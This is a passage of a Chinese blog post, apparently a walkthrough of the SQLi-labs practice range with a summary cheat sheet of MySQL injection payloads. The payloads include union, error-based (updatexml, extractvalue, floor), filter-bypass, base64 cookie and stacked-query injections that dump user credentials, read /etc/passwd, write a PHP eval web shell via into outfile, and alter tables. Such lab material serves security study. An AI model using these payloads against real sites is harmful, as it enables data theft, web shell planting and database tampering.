+<li><pre><code class="hljs">?sort=1;insert into users(id,username,password) values(&#39;41&#39;,&#39;bx&#39;,&#39;2328&#39;);--+
+知道了账户和密码
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment">## 53</span><br><br>堆叠/盲注<br><br>无报错+单引号<br><br>- 存在 <span class="hljs-keyword">if</span> (mysqli_multi_query(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))---&gt;堆叠注入<br><br>- ```<br>  ?<span class="hljs-attribute">sort</span>=1&#x27;;insert into users(id,username,password) values(<span class="hljs-string">&#x27;41&#x27;</span>,<span class="hljs-string">&#x27;bx&#x27;</span>,<span class="hljs-string">&#x27;2328&#x27;</span>);--+<br>  知道了账户和密码<br>  <br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h1 id="总结（精华）"><a href="#总结（精华）" class="headerlink" title="总结（精华）"></a>总结（精华）</h1><p>sql注入的诸多payoad利用 </p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="一、union联合查询注入"><a href="#一、union联合查询注入" class="headerlink" title="一、union联合查询注入"></a>一、union联合查询注入</h2><p>常用函数</p>
+<p>information_schema.tables			#information_schema下面的所有表名<br>information_schema.columns		#information_schema下面所有的列名<br>table_name										#表名<br>column_name										#列名<br>table_schema									#数据库名<br>information_schema进行跨库攻击</p>
+<h3 id="查看当前数据库"><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h3><p>?id&#x3D;-1 union select 1,database() –+</p>
+<p>1、获取到所有的数据库名称</p>
+<p>?id&#x3D;-2 union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>2、指定获取book库中的表名信息</p>
+<p>?id&#x3D;-2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’book’–+<br>3、获取指定数据库security下的users表的列名信息</p>
+<p>?id&#x3D;-2’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’–+<br>4、查询到指定数据</p>
+<p>?id&#x3D;-2 union select book_id,book_title,book_author from book.book limit 0,1——z–+<br>?id&#x3D;-1’ union select 1,2,group_concat(username ,id , password) from users  ——全部</p>
+<h3 id="文件读写函数注入"><a href="#文件读写函数注入" class="headerlink" title="文件读写函数注入"></a>文件读写函数注入</h3><p>load_file 文件读取</p>
+<p> into outfile 或into dumpfile 文件写入</p>
+<p>?id&#x3D;-2 union select 1,load_file(‘&#x2F;etc&#x2F;passwd’),3<br>?id&#x3D;-2’ union select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3–+<br>?id&#x3D;-2’union select 1,’<?php @eval($_POST["chuan"]);?>‘,3 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;chuan.php’ –+</p>
+<h2 id="二、报错盲注"><a href="#二、报错盲注" class="headerlink" title="二、报错盲注"></a>二、报错盲注</h2><h3 id="报错注入所利用函数"><a href="#报错注入所利用函数" class="headerlink" title="报错注入所利用函数"></a>报错注入所利用函数</h3><p>updatexml  extractvalue  floor</p>
+<h4 id="‌updatexml‌函数的基本语法："><a href="#‌updatexml‌函数的基本语法：" class="headerlink" title="‌updatexml‌函数的基本语法："></a>‌updatexml‌函数的基本语法：</h4><p>updatexml(xml_document, XPath_string, new_value)<br>其中，xml_document是XML文档对象，XPath_string是Xpath路径表达式，new_value是更新后的内容。在报错注入中，我们通常将第一个和第三个参数设置为任意值，重点是通过第二个参数注入不符合Xpath语法的表达式，从而引起数据库报错，并通过错误信息获取数据。</p>
+<h4 id="extractvalue‌函数的基本语法："><a href="#extractvalue‌函数的基本语法：" class="headerlink" title="extractvalue‌函数的基本语法："></a>extractvalue‌函数的基本语法：</h4><p>extractvalue(xml_frag, xpath_expr)<br>其中，xml_frag是XML片段，xpath_expr是Xpath表达式。在报错注入中，通过提供一个无效的Xpath表达式，导致函数报错，从而获取数据。</p>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>用于返回小于或等于一个给定数字的最大整数。在SQL注入中，利用 floor() 函数可以构造报错注入。它通常和 group by 以及 count(*) 等函数一起使用来触发数据库报错，从而获取敏感信息。</p>
+<p>报错语句</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,0x7e,username,0x3a,password) from security.users))) #</p>
+<pre><code class="hljs">使用substring截断
+?id=1&#39; and extractvalue(1,concat(0x7e, (select substring((select group_concat(id,0x7e,flag) from ctf.flags),1,1000) )))--+
+</code></pre>
+<h3 id="1、updatexml-payload示例"><a href="#1、updatexml-payload示例" class="headerlink" title="1、updatexml payload示例"></a>1、updatexml payload示例</h3><p>1、爆数据库版本信息<br>k’ and updatexml(1,concat(0x7e,(select version()),0x7e),1)%23<br>k写啥都可以，0x7e是16进制，表示字符‘~’。<br>selecty<br>2、爆数据库当前用户<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select user()),0x7e),1)–+</p>
+<p>3、爆数据库</p>
+<ul>
+<li>所有<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)–+</li>
+<li>当前<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</li>
+</ul>
+<p>4、爆表<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),1)–+<br>更改limit后面的数字limit 0完成表名遍历(即在查询网址上面修改来一个一个查看）。</p>
+<p>使用group_concat(table_name)一次性查询出所有的表名<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)–+</p>
+<p>5、获取users表的字段名<br>?id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1)–+</p>
+<p>6、获取users表的内容<br>id&#x3D;1” and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)–+</p>
+<h3 id="2、extractvalue-payload"><a href="#2、extractvalue-payload" class="headerlink" title="2、extractvalue payload"></a>2、extractvalue payload</h3><p>payload<br>1’ and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) #</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))) #</p>
+<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</p>
+<h3 id="3、floor函数"><a href="#3、floor函数" class="headerlink" title="3、floor函数"></a>3、floor函数</h3><p>判断是否存在报错注入<br>id&#x3D;1’ union select #添加count(<em>)可以增加列数 count(</em>),floor(rand(0)*2) x from information_schema.schemata group by x#</p>
+<p>爆出当前数据库名<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #</p>
+<p>爆出表<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema&#x3D;’dvwa’ limit 0,1)) x from information_schema.schemata group by x#</p>
+<p>爆出字段名<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’dvwa’ limit 0,1)) x from information_schema.schemata group by x#</p>
+<p>爆出user和password<br>id&#x3D;1’ union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x#</p>
+<h3 id="严格过滤"><a href="#严格过滤" class="headerlink" title="严格过滤"></a>严格过滤</h3><p>逻辑运算符，注释符以及空格<br>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’))),1))||’0   爆表</p>
+<p>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema&#x3D;’security’aandnd(table_name&#x3D;’users’)))),1))||’0     爆字段</p>
+<p>?id&#x3D;1’||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||’0   爆密码账户</p>
+<h2 id="三、其余注入"><a href="#三、其余注入" class="headerlink" title="三、其余注入"></a>三、其余注入</h2><h3 id="1、加解密注入"><a href="#1、加解密注入" class="headerlink" title="1、加解密注入"></a>1、加解密注入</h3><p>抓取cookie数据包</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">GET /Less<span class="hljs-number">-21</span>/index.php HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.133</span><br>User-Agent<span class="hljs-punctuation">:</span> Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv<span class="hljs-punctuation">:</span><span class="hljs-number">83.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">83.0</span><br>Accept<span class="hljs-punctuation">:</span> text/html<span class="hljs-punctuation">,</span>application/xhtml+xml<span class="hljs-punctuation">,</span>application/xml;q=<span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span>image/webp<span class="hljs-punctuation">,</span>*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Referer: http://10.1.1.133/Less-21/index.php</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Cookie: uname=YWRtaW4%3D</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br></code></pre></td></tr></table></figure>
+
+<p>YWRtaW4%3D这是一个base64加密的字符串其中%3D是编码中的&#x3D;符号，把他发送到编码模块当中解密,得到明文</p>
+<p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器</p>
+<p>也就是说admin’ and 1&#x3D;1加密之后的值是YWRtaW4nIGFuZCAxPTE&#x3D;</p>
+<p>获取数据库名称admin’ or updatexml(1,concat(0x7e,(database())),0) or ‘加密后cookie值Cookie: uname&#x3D;YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo&#x3D;</p>
+<h3 id="2、二次注入"><a href="#2、二次注入" class="headerlink" title="2、二次注入"></a>2、二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。</p>
+<p>最后我们看到的是将admin的账户密码修改为了123456而admin’#并没有发生改变，原因是代码执行的过程中将’#没有过滤直接带入执行导致’与前面的代码闭合而#将后面的代码给注释。</p>
+<h3 id="3、dnslog注入"><a href="#3、dnslog注入" class="headerlink" title="3、dnslog注入"></a>3、dnslog注入</h3><p>涉及资源：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p>
+<p>使用DnsLog盲注仅限于windos环境。</p>
+<h3 id="4、中转注入"><a href="#4、中转注入" class="headerlink" title="4、中转注入"></a>4、中转注入</h3><p>中转一个网站，利用网站进行数据集中改变</p>
+<h3 id="5、堆叠查询注入"><a href="#5、堆叠查询注入" class="headerlink" title="5、堆叠查询注入"></a>5、堆叠查询注入</h3><p>stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>简单payload</p>
+<p><a target="_blank" rel="noopener" href="http://10.1.1.133/Less-38/index.php?id=1">http://10.1.1.133/Less-38/index.php?id=1</a> ‘;insert into users(id,username,password) values ( 39, ‘less38 ‘, ‘hello ‘)–+<br>查询数据库</p>
+<p>1’;show databases;–+<br>查表</p>
+<p>?inject&#x3D;1’;show tables–+<br>查列</p>
+<p>1’; show columns from <code>words</code>– q<br>修改操作</p>
+<p>1’;rename table words to word2;rename table <code>1919810931114514</code> to words;ALTER TABLE words ADD id int(10) DEFAULT ‘12’;ALTER TABLE  words CHANGE flag data VARCHAR(100);– q</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/" class="category-chain-item">靶场题解</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/" class="print-no-link">#靶场题解</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sqlilab题解&amp;&amp;总结</div>
+      <div>http://example.com/2025/10/27/sqlilab题解&amp;&amp;总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>running</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/27/upload_lab%E9%A2%98%E8%A7%A3/" title="upload_lab题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">upload_lab题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/27/java-sec-code-master%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/" title="java-sec-code-master搭建&amp;&amp;审计">
+                        <span class="hidden-mobile">java-sec-code-master搭建&amp;&amp;审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
